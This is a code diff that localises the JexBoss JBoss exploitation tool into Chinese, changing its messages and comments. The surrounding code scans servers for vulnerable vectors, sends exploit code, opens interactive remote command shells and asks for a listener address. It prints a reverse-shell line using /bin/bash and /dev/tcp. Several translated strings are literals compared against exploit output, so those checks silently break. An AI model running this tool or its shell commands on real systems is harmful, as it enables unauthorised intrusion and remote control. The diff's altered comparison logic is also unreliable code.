@@ -1,7 +1,7 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
 """
-JexBoss: Jboss verify and EXploitation Tool
+Module to group exploits of the JexBoss
 https://github.com/joaomatosf/jexboss
 
 Copyright 2013 João Filho Matos Figueiredo
@@ -17,6 +17,22 @@ distributed under the License is distributed on an "AS IS" BASIS,
 WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 See the License for the specific language governing permissions and
 limitations under the License.
+"""
+"""
+JexBoss: JBoss 验证与漏洞利用工具
+https://github.com/joaomatosf/jexboss
+
+版权所有 2013 João Filho Matos Figueiredo
+
+根据 Apache 许可证 2.0 版本授权
+（"许可证"）；除非符合许可证要求，否则不得使用此文件。
+您可以在以下网址获取许可证副本：
+
+    http://www.apache.org/licenses/LICENSE-2.0
+
+除非适用法律要求或书面同意，否则按"原样"分发软件，
+没有任何明示或暗示的保证或条件。
+请参阅许可证了解具体的语言权限和限制。
 """
 import textwrap
 import traceback
@@ -59,9 +75,9 @@ def print_and_flush(message, same_line=False):
 
 
 if version_info[0] == 2 and version_info[1] < 7:
-    print_and_flush(RED1 + BOLD + "\n * You are using the Python version 2.6. The JexBoss requires version >= 2.7.\n"
-                        "" + GREEN + "   Please install the Python version >= 2.7. \n\n"
-                                     "   Example for CentOS using Software Collections scl:\n"
+    print_and_flush(RED1 + BOLD + "\n * 您正在使用 Python 2.6 版本。JexBoss 需要版本 >= 2.7。\n"
+                        "" + GREEN + "   请安装 Python 版本 >= 2.7。\n\n"
+                                     "   CentOS 使用软件集合 (scl) 的示例:\n"
                                      "   # yum -y install centos-release-scl\n"
                                      "   # yum -y install python27\n"
                                      "   # scl enable python27 bash\n" + ENDC)
@@ -73,7 +89,7 @@ try:
     readline.parse_and_bind('set editing-mode vi')
 except:
     logging.warning('Module readline not installed. The terminal will not support the arrow keys.', exc_info=traceback)
-    print_and_flush(RED1 + "\n * Module readline not installed. The terminal will not support the arrow keys.\n" + ENDC)
+    print_and_flush(RED1 + "\n * 未安装 readline 模块。终端将不支持方向键功能。\n" + ENDC)
 
 
 try:
@@ -88,8 +104,8 @@ try:
     from urllib3 import make_headers
     from urllib3.util import Timeout
 except ImportError:
-    print_and_flush(RED1 + BOLD + "\n * Package urllib3 not installed. Please install the dependencies before continue.\n"
-                        "" + GREEN + "   Example: \n"
+    print_and_flush(RED1 + BOLD + "\n * 未安装 urllib3 包。请在继续前安装依赖项。\n"
+                        "" + GREEN + "   示例: \n"
                                      "   # pip install -r requires.txt\n" + ENDC)
     logging.critical('Module urllib3 not installed. See details:', exc_info=traceback)
     exit(0)
@@ -97,8 +113,8 @@ except ImportError:
 try:
     import ipaddress
 except:
-    print_and_flush(RED1 + BOLD + "\n * Package ipaddress not installed. Please install the dependencies before continue.\n"
-                        "" + GREEN + "   Example: \n"
+    print_and_flush(RED1 + BOLD + "\n * 未安装 ipaddress 包。请在继续前安装依赖项。\n"
+                        "" + GREEN + "   示例: \n"
                                      "   # pip install -r requires.txt\n" + ENDC)
     logging.critical('Module ipaddress not installed. See details:', exc_info=traceback)
     exit(0)
@@ -128,7 +144,7 @@ def get_random_user_agent():
 
 
 def is_proxy_ok():
-    print_and_flush(GREEN + "\n ** Checking proxy: %s **\n\n" % gl_args.proxy)
+    print_and_flush(GREEN + "\n ** 正在检查代理: %s **\n\n" % gl_args.proxy)
 
     headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Connection": "keep-alive",
@@ -136,21 +152,21 @@ def is_proxy_ok():
     try:
         r = gl_http_pool.request('GET', gl_args.host, redirect=False, headers=headers)
     except:
-        print_and_flush(RED + " * Error: Failed to connect to %s using proxy %s.\n"
-                              "   See logs for more details...\n" %(gl_args.host,gl_args.proxy) + ENDC)
+        print_and_flush(RED + " * 错误: 无法通过代理 %s 连接到 %s。\n"
+                              "   查看日志获取更多详情...\n" %(gl_args.host,gl_args.proxy) + ENDC)
         logging.warning("Failed to connect to %s using proxy" %gl_args.host, exc_info=traceback)
         return False
 
     if r.status == 407:
-        print_and_flush(RED + " * Error 407: Proxy authentication is required. \n"
-                                      "   Please enter the correct login and password for authentication. \n"
-                                      "   Example: -P http://proxy.com:3128 -L username:password\n" + ENDC)
+        print_and_flush(RED + " * 错误 407: 需要代理认证。\n"
+                                      "   请输入正确的用户名和密码进行认证。\n"
+                                      "   示例: -P http://proxy.com:3128 -L username:password\n" + ENDC)
         logging.error("Proxy authentication failed")
         return False
 
     elif r.status == 503 or r.status == 502:
-        print_and_flush(RED + " * Error %s: The service %s is not availabel to your proxy. \n"
-                              "   See logs for more details...\n" %(r.status,gl_args.host)+ENDC)
+        print_and_flush(RED + " * 错误 %s: 服务 %s 对您的代理不可用。\n"
+                              "   查看日志获取更多详情...\n" %(r.status,gl_args.host)+ENDC)
         logging.error("Service unavailable to your proxy")
         return False
     else:
@@ -167,10 +183,10 @@ def configure_http_pool():
         timeout = Timeout(connect=gl_args.timeout, read=6.0)
 
     if gl_args.proxy:
-        # when using proxy, protocol should be informed
+        # 使用代理时需要指定协议
         if (gl_args.host is not None and 'http' not in gl_args.host) or 'http' not in gl_args.proxy:
-            print_and_flush(RED + " * When using proxy, you must specify the http or https protocol"
-                                  " (eg. http://%s).\n\n" %(gl_args.host if 'http' not in gl_args.host else gl_args.proxy) +ENDC)
+            print_and_flush(RED + " * 使用代理时，必须指定 http 或 https 协议"
+                                  " (例如 http://%s)。\n\n" %(gl_args.host if 'http' not in gl_args.host else gl_args.proxy) +ENDC)
             logging.critical('Protocol not specified')
             exit(1)
 
@@ -181,7 +197,7 @@ def configure_http_pool():
             else:
                 gl_http_pool = ProxyManager(proxy_url=gl_args.proxy, timeout=timeout, cert_reqs='CERT_NONE')
         except:
-            print_and_flush(RED + " * An error occurred while setting the proxy. Please see log for details..\n\n" +ENDC)
+            print_and_flush(RED + " * 设置代理时出错。请查看日志详情...\n\n" +ENDC)
             logging.critical('Error while setting the proxy', exc_info=traceback)
             exit(1)
     else:
@@ -191,7 +207,7 @@ def configure_http_pool():
 def handler_interrupt(signum, frame):
     global gl_interrupted
     gl_interrupted = True
-    print_and_flush ("Interrupting execution ...")
+    print_and_flush ("正在中断执行...")
     logging.info("Interrupting execution ...")
     exit(1)
 
@@ -216,15 +232,15 @@ def check_connectivity(host, port):
 
 def check_vul(url):
     """
-    Test if a GET to a URL is successful
-    :param url: The URL to test
-    :return: A dict with the exploit type as the keys, and the HTTP status code as the value
+    测试对URL的GET请求是否成功
+    :param url: 要测试的URL
+    :return: 字典，键为漏洞类型，值为HTTP状态码
     """
     url_check = parse_url(url)
     if '443' in str(url_check.port) and url_check.scheme != 'https':
         url = "https://"+str(url_check.host)+":"+str(url_check.port)+str(url_check.path)
 
-    print_and_flush(GREEN + "\n ** Checking Host: %s **\n" % url)
+    print_and_flush(GREEN + "\n ** 正在检查主机: %s **\n" % url)
     logging.info("Checking Host: %s" % url)
 
     headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
@@ -248,7 +264,7 @@ def check_vul(url):
         if gl_interrupted: break
         try:
 
-            # check jmx tomcat only if specifically chosen
+            # 仅当专门选择时检查JMX Tomcat
             if (gl_args.jmxtomcat and vector != 'JMX Tomcat') or\
                     (not gl_args.jmxtomcat and vector == 'JMX Tomcat'): continue
 
@@ -266,17 +282,17 @@ def check_vul(url):
                 paths[vector] = 200
                 continue
 
-            print_and_flush(GREEN + " [*] Checking %s: %s" % (vector, " " * (27 - len(vector))) + ENDC, same_line=True)
+            print_and_flush(GREEN + " [*] 检查 %s: %s" % (vector, " " * (27 - len(vector))) + ENDC, same_line=True)
 
-            # check jenkins
+            # 检查Jenkins
             if vector == 'Jenkins':
 
                 cli_port = None
-                # check version and search for CLI-Port
+                # 检查版本并搜索CLI-Port
                 r = gl_http_pool.request('GET', url, redirect=True, headers=headers)
                 all_headers = r.getheaders()
 
-                # versions > 658 are not vulnerable
+                # 版本 > 658 不易受攻击
                 if 'X-Jenkins' in all_headers:
                     version = int(all_headers['X-Jenkins'].split('.')[1].split('.')[0])
                     if version >= 638:
@@ -293,7 +309,7 @@ def check_vul(url):
                 else:
                     paths[vector] = 505
 
-            # chek vul for Java Unserializable in Application Parameters
+            # 检查应用程序参数中的Java反序列化漏洞
             elif vector == 'Application Deserialization':
 
                 r = gl_http_pool.request('GET', url, redirect=False, headers=headers)
@@ -304,27 +320,27 @@ def check_vul(url):
                 # link, obj = _exploits.get_param_value(r.data, gl_args.post_parameter)
                 obj = _exploits.get_serialized_obj_from_param(str(r.data), gl_args.post_parameter)
 
-                # if no obj serialized, check if there's a html refresh redirect and follow it
+                # 如果没有序列化对象，检查是否有HTML刷新重定向并跟随
                 if obj is None:
-                    # check if theres a redirect link
+                    # 检查是否有重定向链接
                     link = _exploits.get_html_redirect_link(str(r.data))
 
-                    # If it is a redirect link. Follow it
+                    # 如果是重定向链接，则跟随
                     if link is not None:
                         r = gl_http_pool.request('GET', url + "/" + link, redirect=True, headers=headers)
                         #link, obj = _exploits.get_param_value(r.data, gl_args.post_parameter)
                         obj = _exploits.get_serialized_obj_from_param(str(r.data), gl_args.post_parameter)
 
-                # if obj does yet None
+                # 如果对象仍为None
                 if obj is None:
-                    # search for other params that can be exploited
+                    # 搜索其他可被利用的参数
                     list_params = _exploits.get_list_params_with_serialized_objs(str(r.data))
                     if len(list_params) > 0:
                         paths[vector] = 110
-                        print_and_flush(RED + "  [ CHECK OTHER PARAMETERS ]" + ENDC)
-                        print_and_flush(RED + "\n * The \"%s\" parameter does not appear to be vulnerable.\n" %gl_args.post_parameter +
-                                                "   But there are other parameters that it seems to be xD!\n" +ENDC+GREEN+
-                                          BOLD+ "\n   Try these other parameters: \n" +ENDC)
+                        print_and_flush(RED + "  [ 检查其他参数 ]" + ENDC)
+                        print_and_flush(RED + "\n * 参数 \"%s\" 似乎不易受攻击。\n" %gl_args.post_parameter +
+                                                "   但还有其他参数可能易受攻击！\n" +ENDC+GREEN+
+                                          BOLD+ "\n   尝试以下参数: \n" +ENDC)
                         for p in list_params:
                             print_and_flush(GREEN +  "      -H %s" %p+ ENDC)
                         print ("")
@@ -333,7 +349,7 @@ def check_vul(url):
                 elif obj is not None:
                     paths[vector] = 200
 
-            # chek vul for Java Unserializable in viewState
+            # 检查viewState中的Java反序列化漏洞
             elif vector == 'Servlet Deserialization':
 
                 r = gl_http_pool.request('GET', url, redirect=False, headers=headers)
@@ -350,7 +366,7 @@ def check_vul(url):
             elif vector == 'Struts2':
 
                 result = _exploits.exploit_struts2_jakarta_multipart(url, 'jexboss', gl_args.cookies)
-                if result is None or "Could not get command" in str(result) :
+                if result is None or "无法获取命令" in str(result) :
                     paths[vector] = 100
                 elif 'jexboss' in str(result) and "<html>" not in str(result).lower():
                     paths[vector] = 200
@@ -372,12 +388,12 @@ def check_vul(url):
                 else:
                     paths[vector] = 200
 
-            # check jboss vectors
+            # 检查JBoss向量
             elif vector == "JMXInvokerServlet":
-                # user privided web-console path and checking JMXInvoker...
+                # 用户提供web-console路径并检查JMXInvoker...
                 if "/web-console/Invoker" in url:
                     paths[vector] = 505
-                # if the user not provided the path, append the "/invoker/JMXInvokerServlet"
+                # 如果用户未提供路径，追加"/invoker/JMXInvokerServlet"
                 else:
 
                     if not url.endswith(str(paths[vector])) and not url.endswith(str(paths[vector])+"/"):
@@ -386,21 +402,21 @@ def check_vul(url):
                         url_to_check = url
 
                     r = gl_http_pool.request('HEAD', url_to_check , redirect=False, headers=headers)
-                    # if head method is not allowed/supported, try GET
+                    # 如果不支持HEAD方法，尝试GET
                     if r.status in (405, 406):
                         r = gl_http_pool.request('GET', url_to_check , redirect=False, headers=headers)
 
-                    # if web-console/Invoker or invoker/JMXInvokerServlet
+                    # 如果是web-console/Invoker或invoker/JMXInvokerServlet
                     if r.getheader('Content-Type') is not None and 'x-java-serialized-object' in r.getheader('Content-Type'):
                         paths[vector] = 200
                     else:
                         paths[vector] = 505
 
             elif vector == "web-console":
-                # user privided JMXInvoker path and checking web-console...
+                # 用户提供JMXInvoker路径并检查web-console...
                 if "/invoker/JMXInvokerServlet" in url:
                     paths[vector] = 505
-                # if the user not provided the path, append the "/web-console/..."
+                # 如果用户未提供路径，追加"/web-console/..."
                 else:
 
                     if not url.endswith(str(paths[vector])) and not url.endswith(str(paths[vector]) + "/"):
@@ -409,23 +425,23 @@ def check_vul(url):
                         url_to_check = url
 
                     r = gl_http_pool.request('HEAD', url_to_check, redirect=False, headers=headers)
-                    # if head method is not allowed/supported, try GET
+                    # 如果不支持HEAD方法，尝试GET
                     if r.status in (405, 406):
                         r = gl_http_pool.request('GET', url_to_check, redirect=False, headers=headers)
 
-                    # if web-console/Invoker or invoker/JMXInvokerServlet
+                    # 如果是web-console/Invoker或invoker/JMXInvokerServlet
                     if r.getheader('Content-Type') is not None and 'x-java-serialized-object' in r.getheader('Content-Type'):
                         paths[vector] = 200
                     else:
                         paths[vector] = 505
 
-            # other jboss vector
+            # 其他JBoss向量
             else:
                 r = gl_http_pool.request('HEAD', url + str(paths[vector]), redirect=False, headers=headers)
-                # if head method is not allowed/supported, try GET
+                # 如果不支持HEAD方法，尝试GET
                 if r.status in (405, 406):
                     r = gl_http_pool.request('GET', url + str(paths[vector]), redirect=False, headers=headers)
-                # check if the server respond with 200/500 for all requests
+                # 检查服务器是否对所有请求响应200/500
                 if r.status in (200, 500):
                     r = gl_http_pool.request('GET', url + str(paths[vector])+ '/github.com/joaomatosf/jexboss', redirect=False,headers=headers)
 
@@ -437,51 +453,51 @@ def check_vul(url):
                 paths[vector] = r.status
 
             # ----------------
-            # Analysis of the results
+            # 结果分析
             # ----------------
-            # check if the proxy do not support running in the same port of the target
+            # 检查代理是否不支持在目标相同端口上运行
             if r is not None and r.status == 400 and gl_args.proxy:
                 if parse_url(gl_args.proxy).port == url_check.port:
-                    print_and_flush(RED + "[ ERROR ]\n * An error occurred because the proxy server is running on the "
-                                       "same port as the server port (port %s).\n"
-                                       "   Please use a different port in the proxy.\n" % url_check.port + ENDC)
+                    print_and_flush(RED + "[ 错误 ]\n * 发生错误，因为代理服务器运行在\n"
+                                       "   与服务器相同的端口上 (端口 %s)。\n"
+                                       "   请在代理中使用不同的端口。\n" % url_check.port + ENDC)
                     logging.critical("Proxy returns 400 Bad Request because is running in the same port as the server")
                     fatal_error = True
                     break
 
-            # check if it's false positive
+            # 检查是否为假阳性
             if r is not None and len(r.getheaders()) == 0:
-                print_and_flush(RED + "[ ERROR ]\n * The server %s is not an HTTP server.\n" % url + ENDC)
+                print_and_flush(RED + "[ 错误 ]\n * 服务器 %s 不是HTTP服务器。\n" % url + ENDC)
                 logging.error("The server %s is not an HTTP server." % url)
                 for key in paths: paths[key] = 505
                 break
 
             if paths[vector] in (301, 302, 303, 307, 308):
                 url_redirect = r.get_redirect_location()
-                print_and_flush(GREEN + "  [ REDIRECT ]\n * The server sent a redirect to: %s\n" % url_redirect)
+                print_and_flush(GREEN + "  [ 重定向 ]\n * 服务器重定向到: %s\n" % url_redirect)
             elif paths[vector] == 200 or paths[vector] == 500:
                 if vector == "admin-console":
-                    print_and_flush(RED + "  [ EXPOSED ]" + ENDC)
+                    print_and_flush(RED + "  [ 已暴露 ]" + ENDC)
                     logging.info("Server %s: EXPOSED" %url)
                 elif vector == "Jenkins":
-                    print_and_flush(RED + "  [ POSSIBLE VULNERABLE ]" + ENDC)
+                    print_and_flush(RED + "  [ 可能易受攻击 ]" + ENDC)
                     logging.info("Server %s: RUNNING JENKINS" %url)
                 elif vector == "JMX Tomcat":
-                    print_and_flush(RED + "  [ MAYBE VULNERABLE ]" + ENDC)
+                    print_and_flush(RED + "  [ 可能易受攻击 ]" + ENDC)
                     logging.info("Server %s: RUNNING JENKINS" %url)
                 else:
-                    print_and_flush(RED + "  [ VULNERABLE ]" + ENDC)
+                    print_and_flush(RED + "  [ 易受攻击 ]" + ENDC)
                     logging.info("Server %s: VULNERABLE" % url)
             elif paths[vector] == 100:
                 paths[vector] = 200
-                print_and_flush(RED + "  [ INCONCLUSIVE - NEED TO CHECK ]" + ENDC)
+                print_and_flush(RED + "  [ 不确定 - 需要检查 ]" + ENDC)
                 logging.info("Server %s: INCONCLUSIVE - NEED TO CHECK" % url)
             elif paths[vector] == 110:
                 logging.info("Server %s: CHECK OTHERS PARAMETERS" % url)
             else:
-                print_and_flush(GREEN + "  [ OK ]")
+                print_and_flush(GREEN + "  [ 正常 ]")
         except Exception as err:
-            print_and_flush(RED + "\n * An error occurred while connecting to the host %s (%s)\n" % (url, err) + ENDC)
+            print_and_flush(RED + "\n * 连接主机 %s 时出错 (%s)\n" % (url, err) + ENDC)
             logging.info("An error occurred while connecting to the host %s" % url, exc_info=traceback)
             paths[vector] = 505
 
@@ -493,19 +509,19 @@ def check_vul(url):
 
 def auto_exploit(url, exploit_type):
     """
-    Automatically exploit a URL
-    :param url: The URL to exploit
-    :param exploit_type: One of the following
-    exploitJmxConsoleFileRepository: tested and working in JBoss 4 and 5
-    exploitJmxConsoleMainDeploy:	 tested and working in JBoss 4 and 6
-    exploitWebConsoleInvoker:		 tested and working in JBoss 4
-    exploitJMXInvokerFileRepository: tested and working in JBoss 4 and 5
-    exploitAdminConsole: tested and working in JBoss 5 and 6 (with default password)
+    自动利用URL漏洞
+    :param url: 要利用的URL
+    :param exploit_type: 以下之一
+    exploitJmxConsoleFileRepository: 在JBoss 4和5中测试有效
+    exploitJmxConsoleMainDeploy:	 在JBoss 4和6中测试有效
+    exploitWebConsoleInvoker:		 在JBoss 4中测试有效
+    exploitJMXInvokerFileRepository: 在JBoss 4和5中测试有效
+    exploitAdminConsole: 在JBoss 5和6中测试有效（使用默认密码）
     """
     if exploit_type in ("Application Deserialization", "Servlet Deserialization"):
-        print_and_flush(GREEN + "\n * Preparing to send exploit to %s. Please wait...\n" % url)
+        print_and_flush(GREEN + "\n * 正在准备向 %s 发送漏洞利用代码。请稍候...\n" % url)
     else:
-        print_and_flush(GREEN + "\n * Sending exploit code to %s. Please wait...\n" % url)
+        print_and_flush(GREEN + "\n * 正在向 %s 发送漏洞利用代码。请稍候...\n" % url)
 
     result = 505
     if exploit_type == "jmx-console":
@@ -516,7 +532,7 @@ def auto_exploit(url, exploit_type):
 
     elif exploit_type == "web-console":
 
-        # if the user not provided the path
+        # 如果用户未提供路径
         if url.endswith("/web-console/Invoker") or url.endswith("/web-console/Invoker/"):
             url = url.replace("/web-console/Invoker", "")
 
@@ -529,7 +545,7 @@ def auto_exploit(url, exploit_type):
                                                                gadget_file=gl_args.load_gadget)
     elif exploit_type == "JMXInvokerServlet":
 
-        # if the user not provided the path
+        # 如果用户未提供路径
         if url.endswith("/invoker/JMXInvokerServlet") or url.endswith("/invoker/JMXInvokerServlet/"):
             url = url.replace("/invoker/JMXInvokerServlet", "")
 
@@ -583,75 +599,74 @@ def auto_exploit(url, exploit_type):
 
         result = 200
 
-    # if it seems to be exploited (201 is for jboss exploited with gadget)
+    # 如果看起来已利用（201表示使用gadget成功利用jboss）
     if result == 200 or result == 500 or result == 201:
 
-        # if not auto_exploit, ask type enter to continue...
+        # 如果不是自动利用模式，询问是否继续...
         if not gl_args.auto_exploit:
 
             if exploit_type in ("Application Deserialization", "Jenkins", "JMX Tomcat", "Servlet Deserialization") or result == 201:
-                print_and_flush(BLUE + " * The exploit code was successfully sent. Check if you received the reverse shell\n"
-                                       "   connection on your server or if your command was executed. \n"+ ENDC+
-                                       "   Type [ENTER] to continue...\n")
-                # wait while enter is typed
+                print_and_flush(BLUE + " * 漏洞利用代码已成功发送。请检查您是否收到了反向shell连接\n"
+                                       "   或您的命令是否已执行。\n"+ ENDC+
+                                       "   按 [ENTER] 继续...\n")
+                # 等待输入ENTER
                 input().lower() if version_info[0] >= 3 else raw_input().lower()
                 return True
             else:
                 if exploit_type == 'Struts2':
                     shell_http_struts(url)
                 else:
-                    print_and_flush(GREEN + " * Successfully deployed code! Starting command shell. Please wait...\n" + ENDC)
+                    print_and_flush(GREEN + " * 代码部署成功！正在启动命令shell。请稍候...\n" + ENDC)
                     shell_http(url, exploit_type)
 
-        # if auto exploit mode, print message and continue...
+        # 如果是自动利用模式，打印消息并继续...
         else:
-            print_and_flush(GREEN + " * Successfully deployed/sended code via vector %s\n *** Run JexBoss in Standalone mode "
-                                    "to open command shell. ***" %(exploit_type) + ENDC)
+            print_and_flush(GREEN + " * 通过向量 %s 成功部署/发送代码\n *** 请在独立模式下运行JexBoss以打开命令shell。 ***" %(exploit_type) + ENDC)
             return True
 
-    # if not exploited, print error messagem and ask for type enter
+    # 如果未成功利用，打印错误消息并要求输入ENTER
     else:
         if exploit_type == 'admin-console':
-            print_and_flush(GREEN + "\n * You can still try to exploit deserialization vulnerabilitie in ViewState!\n" +
-                     "   Try this: python jexboss.py -u %s/admin-console/login.seam --app-unserialize\n" %url +
-                     "   Type [ENTER] to continue...\n" + ENDC)
+            print_and_flush(GREEN + "\n * 您仍然可以尝试利用ViewState中的反序列化漏洞！\n" +
+                     "   尝试: python jexboss.py -u %s/admin-console/login.seam --app-unserialize\n" %url +
+                     "   按 [ENTER] 继续...\n" + ENDC)
 
         else:
-            print_and_flush(RED + "\n * Could not exploit the flaw automatically. Exploitation requires manual analysis...\n" +
-                                "   Type [ENTER] to continue...\n" + ENDC)
+            print_and_flush(RED + "\n * 无法自动利用该漏洞。利用需要手动分析...\n" +
+                                "   按 [ENTER] 继续...\n" + ENDC)
         logging.error("Could not exploit the server %s automatically. HTTP Code: %s" %(url, result))
-        # wait while enter is typed
+        # 等待输入ENTER
         input().lower() if version_info[0] >= 3 else raw_input().lower()
         return False
 
 
 def ask_for_reverse_host_and_port():
-    print_and_flush(GREEN + " * Please enter the IP address and tcp PORT of your listening server for try to get a REVERSE SHELL.\n"
-                            "   OBS: You can also use the --cmd \"command\" to send specific commands to run on the server."+NORMAL)
+    print_and_flush(GREEN + " * 请输入您的监听服务器的IP地址和TCP端口以尝试获取反向SHELL。\n"
+                            "   注意: 您也可以使用 --cmd \"命令\" 在服务器上运行特定命令。"+NORMAL)
 
-    # If not *nix (that is, if somethine like git bash on Rwindow$)
+    # 如果不是*nix系统（例如Windows上的git bash）
     if not sys.stdout.isatty():
-        print_and_flush("   IP Address (RHOST): ", same_line=True)
+        print_and_flush("   IP地址 (RHOST): ", same_line=True)
         host = input().lower() if version_info[0] >= 3 else raw_input().lower()
-        print_and_flush("   Port (RPORT): ", same_line=True)
+        print_and_flush("   端口 (RPORT): ", same_line=True)
         port = input().lower() if version_info[0] >= 3 else raw_input().lower()
     else:
-        host = input("   IP Address (RHOST): ").lower() if version_info[0] >= 3 else raw_input("   IP Address (RHOST): ").lower()
-        port = input("   Port (RPORT): ").lower() if version_info[0] >= 3 else raw_input("   Port (RPORT): ").lower()
+        host = input("   IP地址 (RHOST): ").lower() if version_info[0] >= 3 else raw_input("   IP地址 (RHOST): ").lower()
+        port = input("   端口 (RPORT): ").lower() if version_info[0] >= 3 else raw_input("   端口 (RPORT): ").lower()
 
     print ("")
     return str(host), str(port)
 
 
 def get_host_port_reverse_params():
-    # if reverse host were provided in the args, take it
+    # 如果在参数中提供了反向主机，则使用它
     if gl_args.reverse_host:
 
         if gl_args.windows:
-            jexboss.print_and_flush(RED + "\n * WINDOWS Systems still do not support reverse shell.\n"
-                                          "   Use option --cmd instead of --reverse-shell...\n" + ENDC +
-                                    "   Type [ENTER] to continue...\n")
-            # wait while enter is typed
+            jexboss.print_and_flush(RED + "\n * WINDOWS 系统尚不支持反向SHELL。\n"
+                                          "   请使用选项 --cmd 代替 --reverse-shell...\n" + ENDC +
+                                    "   按 [ENTER] 继续...\n")
+            # 等待输入ENTER
             input().lower() if version_info[0] >= 3 else raw_input().lower()
             return None, None
 
@@ -661,11 +676,11 @@ def get_host_port_reverse_params():
         else:
             host = tokens[0]
             port = tokens[1]
-    # if neither cmd nor reverse nor load_gadget was provided, ask host and port
+    # 如果既没有提供命令也没有提供反向主机或加载gadget，则询问主机和端口
     elif gl_args.cmd is None and gl_args.load_gadget is None:
         host, port = ask_for_reverse_host_and_port()
     else:
-        # if cmd or gadget file ware privided
+        # 如果提供了命令或gadget文件
         host, port = None, None
 
     return host, port
@@ -673,18 +688,17 @@ def get_host_port_reverse_params():
 
 def shell_http_struts(url):
     """
-    Connect to an HTTP shell
-    :param url: struts app url
-    :param shell_type: The type of shell to connect to
+    连接到HTTP shell
+    :param url: struts应用程序URL
     """
-    print_and_flush("# ----------------------------------------- #\n")
-    print_and_flush(GREEN + BOLD + " * For a Reverse Shell (like meterpreter =]), type sometime like: \n\n"
+    print_and_flush("# ------------------------------------------------------------------------- #\n")
+    print_and_flush(GREEN + BOLD + " * 要获取反向SHELL（例如meterpreter =），请输入类似以下命令: \n\n"
                     "\n" +ENDC+
                     "     Shell>/bin/bash -i > /dev/tcp/192.168.0.10/4444 0>&1 2>&1\n"
                     "   \n"+GREEN+
-                    "   And so on... =]\n" +ENDC
+                    "   依此类推... =]\n" +ENDC
                     )
-    print_and_flush("# ----------------------------------------- #\n")
+    print_and_flush("# ------------------------------------------------------------------------- #\n")
 
     resp = _exploits.exploit_struts2_jakarta_multipart(url,'whoami', gl_args.cookies)
 
@@ -692,7 +706,7 @@ def shell_http_struts(url):
     logging.info("Server %s exploited!" %url)
 
     while 1:
-        print_and_flush(BLUE + "[Type commands or \"exit\" to finish]" +ENDC)
+        print_and_flush(BLUE + "[输入命令或输入\"exit\"退出]" +ENDC)
 
         if not sys.stdout.isatty():
             print_and_flush("Shell> ", same_line=True)
@@ -707,12 +721,12 @@ def shell_http_struts(url):
         print_and_flush(resp.replace('\\n', '\n'))
 
 
-# FIX: capture the readtimeout   File "jexboss.py", line 333, in shell_http
+# FIX: 捕获读取超时   File "jexboss.py", line 333, in shell_http
 def shell_http(url, shell_type):
     """
-    Connect to an HTTP shell
-    :param url: The URL to connect to
-    :param shell_type: The type of shell to connect to
+    连接到HTTP shell
+    :param url: 要连接的URL
+    :param shell_type: 要连接的shell类型
     """
     headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Connection": "keep-alive",
@@ -733,15 +747,15 @@ def shell_http(url, shell_type):
     print_and_flush("# ----------------------------------------- # LOL # ----------------------------------------- #\n")
     print_and_flush(RED + " * " + url + ": \n" + ENDC)
     print_and_flush("# ----------------------------------------- #\n")
-    print_and_flush(GREEN + BOLD + " * For a Reverse Shell (like meterpreter =]), type the command: \n\n"
-                                   "   jexremote=YOUR_IP:YOUR_PORT\n\n" + ENDC + GREEN +
-                    "   Example:\n" +ENDC+
+    print_and_flush(GREEN + BOLD + " * 要获取反向SHELL（例如meterpreter），请输入命令: \n\n"
+                                   "   jexremote=您的IP:您的端口\n\n" + ENDC + GREEN +
+                    "   示例:\n" +ENDC+
                     "     Shell>jexremote=192.168.0.10:4444\n"
                     "\n" +GREEN+
-                    "   Or use other techniques of your choice, like:\n" +ENDC+
+                    "   或使用您选择的其他技术，例如:\n" +ENDC+
                     "     Shell>/bin/bash -i > /dev/tcp/192.168.0.10/4444 0>&1 2>&1\n"
                     "   \n"+GREEN+
-                    "   And so on... =]\n" +ENDC
+                    "   依此类推... =]\n" +ENDC
                     )
     print_and_flush("# ----------------------------------------- #\n")
 
@@ -751,7 +765,7 @@ def shell_http(url, shell_type):
             r = gl_http_pool.request('GET', url + path + cmd, redirect=False, headers=headers)
             resp += " " + str(r.data).split(">")[1]
         except:
-            print_and_flush(RED + " * Apparently an IPS is blocking some requests. Check for updates will be disabled...\n\n"+ENDC)
+            print_and_flush(RED + " * 似乎有IPS正在阻止某些请求。将禁用更新检查...\n\n"+ENDC)
             logging.warning("Disabling checking for updates.", exc_info=traceback)
             headers['no-check-updates'] = 'true'
 
@@ -759,7 +773,7 @@ def shell_http(url, shell_type):
     logging.info("Server %s exploited!" %url)
 
     while 1:
-        print_and_flush(BLUE + "[Type commands or \"exit\" to finish]" +ENDC)
+        print_and_flush(BLUE + "[输入命令或输入\"exit\"退出]" +ENDC)
 
         if not sys.stdout.isatty():
             print_and_flush("Shell> ", same_line=True)
@@ -774,28 +788,28 @@ def shell_http(url, shell_type):
         try:
             r = gl_http_pool.request('GET', url + path + cmd, redirect=False, headers=headers)
         except:
-            print_and_flush(RED + " * Error contacting the command shell. Try again and see logs for details ...")
+            print_and_flush(RED + " * 联系命令shell时出错。请重试并查看日志详情...")
             logging.error("Error contacting the command shell", exc_info=traceback)
             continue
 
         resp = str(r.data)
         if r.status == 404:
-            print_and_flush(RED + " * Error contacting the command shell. Try again later...")
+            print_and_flush(RED + " * 联系命令shell时出错。请稍后重试...")
             continue
         stdout = ""
         try:
             stdout = resp.split("pre>")[1]
         except:
-            print_and_flush(RED + " * Error contacting the command shell. Try again later...")
-        if stdout.count("An exception occurred processing JSP page") == 1:
-            print_and_flush(RED + " * Error executing command \"%s\". " % cmd.split("=")[1] + ENDC)
+            print_and_flush(RED + " * 联系命令shell时出错。请稍后重试...")
+        if stdout.count("处理JSP页面时发生异常") == 1:
+            print_and_flush(RED + " * 执行命令 \"%s\" 时出错。 " % cmd.split("=")[1] + ENDC)
         else:
             print_and_flush(stdout.replace('\\n', '\n'))
 
 
 def clear():
     """
-    Clears the console
+    清空控制台
     """
     if name == 'posix':
         system('clear')
@@ -805,55 +819,54 @@ def clear():
 
 def banner():
     """
-    Print the banner
+    打印横幅
     """
     clear()
-    print_and_flush(RED1 + "\n * --- JexBoss: Jboss verify and EXploitation Tool  --- *\n"
-                 " |  * And others Java Deserialization Vulnerabilities * | \n"
-                 " |                                                      |\n"
-                 " | @author:  João Filho Matos Figueiredo                |\n"
-                 " | @contact: joaomatosf@gmail.com                       |\n"
